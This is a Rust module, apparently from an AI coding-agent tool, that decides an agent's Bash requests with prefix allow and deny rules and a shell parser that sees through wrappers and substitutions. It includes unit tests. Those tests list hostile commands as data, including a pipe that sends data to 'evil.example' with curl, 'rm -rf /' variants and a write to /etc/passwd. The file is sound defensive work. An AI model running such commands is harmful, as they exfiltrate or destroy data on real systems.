//! Approval rules by command prefix: decide some of an agent's Bash requests
//! without asking, and record who decided each one.
//!
//! A rule is a command's first words, 1 to 8 of them, like `["git",
//! "status"]`. The two kinds are read differently, on purpose:
//!
//! - An **allow** rule matches only a single simple command whose words
//!   start with the rule's: no pipe, list (`;`, `&&`, `||`), background job,
//!   redirection, subshell, variable assignment, wrapper program (`sudo`,
//!   `env`, `xargs`, `sh -c`, ...), substitution (`$(...)`, backticks),
//!   expansion (`$VAR`, `~`) or glob. Flags count as words, so `["git",
//!   "push"]` covers `git push --force` while `git -C repo push` matches
//!   nothing. Anything an allow rule does not clearly cover is asked.
//! - A **deny** rule matches anywhere: in every command of a list or
//!   pipeline, inside substitutions, behind wrappers (`sudo git push`, `env
//!   X=1 git push`, `sh -c 'git push'`, `xargs git push`, `find -exec`).
//!   Deny wins over allow.
//!
//! Only Bash requests are decided; every other tool is asked as before.

use serde::{Deserialize, Serialize};
use serde_json::Value;

/// `[approvals]` in indra.toml, and a profile's own rules.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Rules {
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<Vec<String>>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub deny: Vec<Vec<String>>,
}

/// What the rules say about one request.
#[derive(Debug, Clone, PartialEq)]
pub enum Verdict {
    /// Allowed by this rule (its words, joined).
    Allow(String),
    /// Refused by this rule.
    Deny(String),
    /// No rule decides: a person does.
    Ask,
}

impl Rules {
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty() && self.deny.is_empty()
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.allow.len() + self.deny.len() > 500 {
            return Err("at most 500 approval rules".into());
        }
        for r in self.allow.iter().chain(&self.deny) {
            if r.is_empty() || r.len() > 8 {
                return Err(format!(
                    "an approval rule is 1 to 8 words, like [\"git\", \"status\"], not {:?}",
                    r
                ));
            }
            for w in r {
                if w.is_empty()
                    || w.len() > 200
                    || w.chars().any(|c| c.is_control() || c.is_whitespace())
                {
                    return Err(format!("bad word in approval rule {:?}: {:?}", r, w));
                }
            }
        }
        Ok(())
    }

    /// `other`'s rules added to these.
    pub fn merged(&self, other: &Rules) -> Rules {
        let mut r = self.clone();
        for a in &other.allow {
            if !r.allow.contains(a) {
                r.allow.push(a.clone());
            }
        }
        for d in &other.deny {
            if !r.deny.contains(d) {
                r.deny.push(d.clone());
            }
        }
        r
    }

    /// Decide a tool request.
    pub fn decide(&self, tool: &str, input: &Value) -> Verdict {
        if self.is_empty() || tool != "Bash" {
            return Verdict::Ask;
        }
        let Some(cmd) = input.get("command").and_then(Value::as_str) else {
            return Verdict::Ask;
        };
        let parsed = parse(cmd);
        // Deny: every command, unwrapped, anywhere.
        let mut all = Vec::new();
        collect(&parsed, 0, &mut all);
        for argv in &all {
            for d in &self.deny {
                if starts_with(argv, d) {
                    return Verdict::Deny(d.join(" "));
                }
            }
        }
        if parsed.broken {
            return Verdict::Ask;
        }
        // Allow: exactly one plain simple command.
        if parsed.cmds.len() != 1 || parsed.compound || !parsed.subs.is_empty() {
            return Verdict::Ask;
        }
        let c = &parsed.cmds[0];
        if c.redirect || c.expand || c.assign || c.argv.is_empty() || is_wrapper(&c.argv[0]) {
            return Verdict::Ask;
        }
        for a in &self.allow {
            if starts_with(&c.argv, a) {
                return Verdict::Allow(a.join(" "));
            }
        }
        Verdict::Ask
    }
}

fn starts_with(argv: &[String], rule: &[String]) -> bool {
    argv.len() >= rule.len() && argv.iter().zip(rule).all(|(a, r)| a == r)
}

/// One simple command.
#[derive(Debug, Default, Clone)]
struct Cmd {
    argv: Vec<String>,
    /// Leading `NAME=value` words (not in argv).
    assign: bool,
    redirect: bool,
    /// An unquoted `$`, `~` or glob in a word.
    expand: bool,
}

#[derive(Debug, Default)]
struct Parsed {
    cmds: Vec<Cmd>,
    /// More than one command, a pipe, a list, a background job or a subshell.
    compound: bool,
    /// The text inside `$(...)`, backticks and `<(...)`.
    subs: Vec<String>,
    /// Unbalanced quotes or parentheses: never allowed.
    broken: bool,
}

fn is_wrapper(w: &str) -> bool {
    let base = w.rsplit('/').next().unwrap_or(w);
    matches!(
        base,
        "sudo"
            | "doas"
            | "env"
            | "nohup"
            | "nice"
            | "ionice"
            | "timeout"
            | "time"
            | "command"
            | "builtin"
            | "exec"
            | "xargs"
            | "stdbuf"
            | "setsid"
            | "chroot"
            | "watch"
            | "unbuffer"
            | "eval"
            | "sh"
            | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "find"
            | "parallel"
            | "su"
            | "runuser"
            | "script"
            | "flock"
            | "strace"
            | "ltrace"
    )
}

/// The text up to the `)` that closes one already opened, and where it ends.
fn closing(chars: &[char], mut i: usize) -> Option<(String, usize)> {
    let mut depth = 1;
    let mut out = String::new();
    let mut q: Option<char> = None;
    while i < chars.len() {
        let c = chars[i];
        match q {
            Some('\'') => {
                if c == '\'' {
                    q = None;
                }
            }
            Some(_) => {
                if c == '\\' && i + 1 < chars.len() {
                    out.push(c);
                    i += 1;
                    out.push(chars[i]);
                    i += 1;
                    continue;
                }
                if c == '"' {
                    q = None;
                }
            }
            None => match c {
                '\'' | '"' => q = Some(c),
                '\\' if i + 1 < chars.len() => {
                    out.push(c);
                    i += 1;
                    out.push(chars[i]);
                    i += 1;
                    continue;
                }
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some((out, i + 1));
                    }
                }
                _ => {}
            },
        }
        out.push(c);
        i += 1;
    }
    None
}

fn parse(s: &str) -> Parsed {
    let chars: Vec<char> = s.chars().collect();
    let mut p = Parsed::default();
    let mut cur = Cmd::default();
    let mut word = String::new();
    let mut in_word = false;
    // The word just read follows a redirection operator: it is a file name.
    let mut redir_target = false;
    let mut i = 0;
    let finish_word = |cur: &mut Cmd, word: &mut String, in_word: &mut bool, redir: &mut bool| {
        if *in_word {
            if *redir {
                *redir = false;
            } else if cur.argv.is_empty()
                && word.contains('=')
                && word
                    .split('=')
                    .next()
                    .map(|n| {
                        !n.is_empty()
                            && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                            && !n.starts_with(|c: char| c.is_ascii_digit())
                    })
                    .unwrap_or(false)
            {
                cur.assign = true;
            } else {
                cur.argv.push(std::mem::take(word));
            }
            word.clear();
            *in_word = false;
        }
    };
    let finish_cmd = |p: &mut Parsed, cur: &mut Cmd| {
        let c = std::mem::take(cur);
        if !c.argv.is_empty() || c.assign || c.redirect {
            p.cmds.push(c);
        }
    };
    while i < chars.len() {
        let c = chars[i];
        match c {
            ' ' | '\t' => {
                finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
                i += 1;
            }
            '\n' | ';' => {
                finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
                finish_cmd(&mut p, &mut cur);
                if c == ';' || i + 1 < chars.len() {
                    p.compound = true;
                }
                i += 1;
            }
            '|' | '&' => {
                // `>&2`, `&>` and `|&` are redirections or pipes either way.
                if c == '&' && chars.get(i + 1) == Some(&'>') {
                    finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
                    cur.redirect = true;
                    redir_target = true;
                    i += 2;
                    if chars.get(i) == Some(&'>') {
                        i += 1;
                    }
                    continue;
                }
                finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
                finish_cmd(&mut p, &mut cur);
                p.compound = true;
                i += 1;
                if i < chars.len() && (chars[i] == c || (c == '|' && chars[i] == '&')) {
                    i += 1;
                }
            }
            '<' | '>' => {
                // `<(...)` and `>(...)`: process substitution.
                if chars.get(i + 1) == Some(&'(') {
                    match closing(&chars, i + 2) {
                        Some((inner, end)) => {
                            p.subs.push(inner);
                            in_word = true;
                            cur.expand = true;
                            i = end;
                        }
                        None => {
                            p.broken = true;
                            break;
                        }
                    }
                    continue;
                }
                // `2>` : the digits belong to the operator.
                if in_word && word.chars().all(|d| d.is_ascii_digit()) {
                    word.clear();
                    in_word = false;
                }
                finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
                cur.redirect = true;
                i += 1;
                while i < chars.len() && (chars[i] == '<' || chars[i] == '>' || chars[i] == '&') {
                    i += 1;
                }
                redir_target = true;
            }
            '(' | ')' | '{' | '}' if !in_word => {
                // A subshell or group.
                p.compound = true;
                finish_cmd(&mut p, &mut cur);
                i += 1;
            }
            '\'' => {
                in_word = true;
                i += 1;
                let start = i;
                while i < chars.len() && chars[i] != '\'' {
                    i += 1;
                }
                if i >= chars.len() {
                    p.broken = true;
                    break;
                }
                word.extend(&chars[start..i]);
                i += 1;
            }
            '"' => {
                in_word = true;
                i += 1;
                loop {
                    if i >= chars.len() {
                        p.broken = true;
                        break;
                    }
                    let d = chars[i];
                    if d == '"' {
                        i += 1;
                        break;
                    }
                    if d == '\\' && i + 1 < chars.len() {
                        word.push(chars[i + 1]);
                        i += 2;
                        continue;
                    }
                    if d == '$' {
                        cur.expand = true;
                        if chars.get(i + 1) == Some(&'(') {
                            match closing(&chars, i + 2) {
                                Some((inner, end)) => {
                                    p.subs.push(inner);
                                    i = end;
                                    continue;
                                }
                                None => {
                                    p.broken = true;
                                    break;
                                }
                            }
                        }
                    }
                    if d == '`' {
                        cur.expand = true;
                        let start = i + 1;
                        let mut j = start;
                        while j < chars.len() && chars[j] != '`' {
                            j += 1;
                        }
                        if j >= chars.len() {
                            p.broken = true;
                            break;
                        }
                        p.subs.push(chars[start..j].iter().collect());
                        i = j + 1;
                        continue;
                    }
                    word.push(d);
                    i += 1;
                }
                if p.broken {
                    break;
                }
            }
            '\\' => {
                in_word = true;
                if i + 1 < chars.len() {
                    if chars[i + 1] != '\n' {
                        word.push(chars[i + 1]);
                    }
                    i += 2;
                } else {
                    i += 1;
                }
            }
            '$' => {
                in_word = true;
                cur.expand = true;
                if chars.get(i + 1) == Some(&'(') {
                    match closing(&chars, i + 2) {
                        Some((inner, end)) => {
                            p.subs.push(inner);
                            i = end;
                        }
                        None => {
                            p.broken = true;
                            break;
                        }
                    }
                } else {
                    word.push(c);
                    i += 1;
                }
            }
            '`' => {
                in_word = true;
                cur.expand = true;
                let start = i + 1;
                let mut j = start;
                while j < chars.len() && chars[j] != '`' {
                    j += 1;
                }
                if j >= chars.len() {
                    p.broken = true;
                    break;
                }
                p.subs.push(chars[start..j].iter().collect());
                i = j + 1;
            }
            '*' | '?' | '[' | '~' => {
                if c != '~' || !in_word {
                    cur.expand = true;
                }
                in_word = true;
                word.push(c);
                i += 1;
            }
            '#' if !in_word => {
                // A comment, to the end of the line.
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
            }
            _ => {
                in_word = true;
                word.push(c);
                i += 1;
            }
        }
    }
    finish_word(&mut cur, &mut word, &mut in_word, &mut redir_target);
    finish_cmd(&mut p, &mut cur);
    if p.cmds.len() > 1 {
        p.compound = true;
    }
    p
}

/// Every command `p` runs, with its wrappers taken off, for deny rules:
/// those of its lists and pipelines, of its substitutions, and of the
/// commands its wrappers run (`sudo X`, `sh -c 'X'`, `find -exec X`).
fn collect(p: &Parsed, depth: usize, out: &mut Vec<Vec<String>>) {
    if depth > 8 {
        return;
    }
    for c in &p.cmds {
        unwrap(&c.argv, depth, out);
    }
    for s in &p.subs {
        collect(&parse(s), depth + 1, out);
    }
}

fn unwrap(argv: &[String], depth: usize, out: &mut Vec<Vec<String>>) {
    if argv.is_empty() || depth > 8 {
        return;
    }
    out.push(argv.to_vec());
    let base = argv[0].rsplit('/').next().unwrap_or(&argv[0]).to_string();
    if base != argv[0] {
        // `/usr/bin/curl` is `curl` to a deny rule.
        let mut b = argv.to_vec();
        b[0] = base.clone();
        out.push(b);
    }
    let rest = &argv[1..];
    // Options of the wrapper that take a value.
    let takes: &[&str] = match base.as_str() {
        "sudo" => &["-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U"],
        "doas" => &["-u", "-C"],
        "env" => &["-u", "-C", "-S"],
        "nice" => &["-n"],
        "ionice" => &["-c", "-n", "-p"],
        "timeout" => &["-s", "-k", "--signal", "--kill-after"],
        "xargs" => &[
            "-I", "-L", "-n", "-P", "-s", "-d", "-E", "-a", "-i", "-l", "-e",
        ],
        "stdbuf" => &["-i", "-o", "-e"],
        "flock" => &["-w", "-E", "-c"],
        "su" | "runuser" => &["-c", "-g", "-G", "-s", "-u"],
        "watch" => &["-n", "-d"],
        "strace" | "ltrace" => &["-o", "-e", "-p", "-s"],
        _ => &[],
    };
    match base.as_str() {
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "eval" | "su" | "runuser" | "flock" => {
            // `sh -c 'cmd'`, `eval 'cmd'`, `su -c 'cmd'`: the script.
            if base == "eval" {
                collect(&parse(&rest.join(" ")), depth + 1, out);
                return;
            }
            if let Some(i) = rest.iter().position(|a| {
                a == "-c" || a.ends_with('c') && a.starts_with('-') && !a.starts_with("--")
            }) {
                if let Some(script) = rest.get(i + 1) {
                    collect(&parse(script), depth + 1, out);
                }
            }
        }
        "find" => {
            for (i, a) in rest.iter().enumerate() {
                if matches!(a.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
                    let cmd: Vec<String> = rest[i + 1..]
                        .iter()
                        .take_while(|x| *x != ";" && *x != "+")
                        .cloned()
                        .collect();
                    unwrap(&cmd, depth + 1, out);
                }
            }
        }
        b if is_wrapper(b) => {
            let mut i = 0;
            while i < rest.len() {
                let a = &rest[i];
                if a == "--" {
                    i += 1;
                    break;
                }
                if a.starts_with('-') && a.len() > 1 {
                    i += if takes.contains(&a.as_str()) { 2 } else { 1 };
                    continue;
                }
                // env NAME=value; timeout DURATION; nice/chrt numbers.
                if (b == "env" && a.contains('='))
                    || (b == "timeout" && a.chars().next().is_some_and(|c| c.is_ascii_digit()))
                {
                    i += 1;
                    continue;
                }
                break;
            }
            unwrap(&rest[i.min(rest.len())..], depth + 1, out);
        }
        _ => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn rules() -> Rules {
        let w = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        Rules {
            allow: vec![
                w(&["git", "status"]),
                w(&["git", "push"]),
                w(&["cargo", "test"]),
                w(&["ls"]),
            ],
            deny: vec![
                w(&["git", "push", "--force"]),
                w(&["rm", "-rf"]),
                w(&["curl"]),
            ],
        }
    }

    fn d(cmd: &str) -> Verdict {
        rules().decide("Bash", &json!({ "command": cmd }))
    }

    #[test]
    fn allow_matches_one_plain_command_only() {
        assert_eq!(d("git status"), Verdict::Allow("git status".into()));
        assert_eq!(
            d("git status --short -b"),
            Verdict::Allow("git status".into())
        );
        assert_eq!(d("git push origin main"), Verdict::Allow("git push".into()));
        assert_eq!(
            d("cargo test --all-targets"),
            Verdict::Allow("cargo test".into())
        );
        assert_eq!(d("  git   status  "), Verdict::Allow("git status".into()));
        assert_eq!(d("'git' \"status\""), Verdict::Allow("git status".into()));
        // A flag before the subcommand: the words differ, so no match.
        assert_eq!(d("git -C /repo push"), Verdict::Ask);
        // Lists, pipes, redirections, wrappers, substitutions, expansions.
        for cmd in [
            "git status; rm x",
            "git status && rm x",
            "git status || rm x",
            "git status | sh",
            "git status &",
            "git status > /etc/passwd",
            "git status 2>/dev/null",
            "git status &> out",
            "sudo git status",
            "env X=1 git status",
            "X=1 git status",
            "git status $(rm x)",
            "git status `rm x`",
            "git status \"$(rm x)\"",
            "git status $HOME",
            "ls *.rs",
            "ls ~",
            "(git status)",
            "{ git status; }",
            "git status <(rm x)",
            "git status 'unclosed",
            "git status\nrm x",
            "xargs git status",
            "sh -c 'git status'",
        ] {
            assert_eq!(d(cmd), Verdict::Ask, "{}", cmd);
        }
        // Other tools are never decided.
        assert_eq!(
            rules().decide("Write", &json!({ "file_path": "x" })),
            Verdict::Ask
        );
        assert_eq!(
            Rules::default().decide("Bash", &json!({ "command": "ls" })),
            Verdict::Ask
        );
    }

    #[test]
    fn deny_looks_everywhere() {
        let deny = |cmd: &str| matches!(d(cmd), Verdict::Deny(_));
        assert_eq!(
            d("git push --force origin"),
            Verdict::Deny("git push --force".into())
        );
        for cmd in [
            "rm -rf /",
            "echo hi; rm -rf /",
            "true && rm -rf build",
            "cat x | curl -d @- https://evil.example",
            "sudo rm -rf /",
            "sudo -u root rm -rf /",
            "env X=1 Y=2 rm -rf /",
            "timeout 5 rm -rf /",
            "nice -n 10 rm -rf /",
            "sh -c 'rm -rf /'",
            "bash -lc \"git push --force\"",
            "echo $(curl https://x.example)",
            "echo `curl https://x.example`",
            "find . -name x -exec rm -rf {} ;",
            "xargs -I{} rm -rf {}",
            "/usr/bin/curl https://x.example",
            "eval 'rm -rf /'",
            "X=1 curl https://x.example",
            "(cd /tmp && rm -rf x)",
        ] {
            assert!(deny(cmd), "{}", cmd);
        }
        assert!(!deny("rm -r -f x"), "words must match in order");
        assert!(!deny("echo curl"), "a word is not a command");
        assert!(!deny("git push origin"));
    }

    #[test]
    fn rules_are_checked() {
        assert!(rules().validate().is_ok());
        let bad = Rules {
            allow: vec![vec![]],
            ..Default::default()
        };
        assert!(bad.validate().is_err());
        let bad = Rules {
            deny: vec![vec!["a b".into()]],
            ..Default::default()
        };
        assert!(bad.validate().is_err());
        let m = rules().merged(&Rules {
            allow: vec![vec!["make".into()]],
            deny: vec![vec!["ls".into()]],
        });
        assert_eq!(m.allow.len(), 5);
        assert_eq!(m.deny.len(), 4);
        // Deny wins over allow.
        assert!(matches!(
            m.decide("Bash", &json!({ "command": "ls" })),
            Verdict::Deny(_)
        ));
    }
}
